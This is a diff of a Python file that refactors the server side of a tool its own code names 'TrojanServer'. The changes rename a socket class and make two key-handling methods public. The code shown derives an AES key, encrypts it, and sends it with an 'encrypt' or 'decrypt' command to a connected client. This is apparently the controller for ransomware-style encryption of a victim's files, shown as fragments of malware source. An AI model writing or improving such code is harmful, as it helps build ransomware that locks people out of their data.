@@ -12,7 +12,7 @@ import base64
 from random_word import RandomWords
 import protocol
 
-class SocketConnection:
+class SecureSocketServer:
     def __init__(self, host, port, cert, key):
         self.host = host
         self.port = port
@@ -92,9 +92,9 @@ class TrojanServer:
 
     def run(self):
         if self.action == "encrypt":
-            aes_key = self._generate_and_store_key()
+            aes_key = self.generate_and_store_key()
         else:
-            aes_key = self._load_and_decrypt_key()
+            aes_key = self.load_and_decrypt_key()
 
         protocol.send(self.conn, aes_key)
         protocol.send(self.conn, self.action)
@@ -104,7 +104,7 @@ class TrojanServer:
 
         print(decoded_data)
 
-    def _generate_and_store_key(self):
+    def generate_and_store_key(self):
         word = self.keys.get_random_word()
         aes_key = self.keys.derive_key_from_word(word)
         encrypted = self.keys.encrypt_aes_key(aes_key)
@@ -124,6 +124,6 @@ if __name__ == "__main__":
     KEY = "path/to/key.pem"
     action = "encrypt"  # enter "encrypt" or " decrypt" manually
 
-    conn = SocketConnection(HOST, PORT, CERT, KEY).wait_for_client()
+    conn = SecureSocketServer(HOST, PORT, CERT, KEY).wait_for_client()
     with conn:
         TrojanServer(action, conn).run()
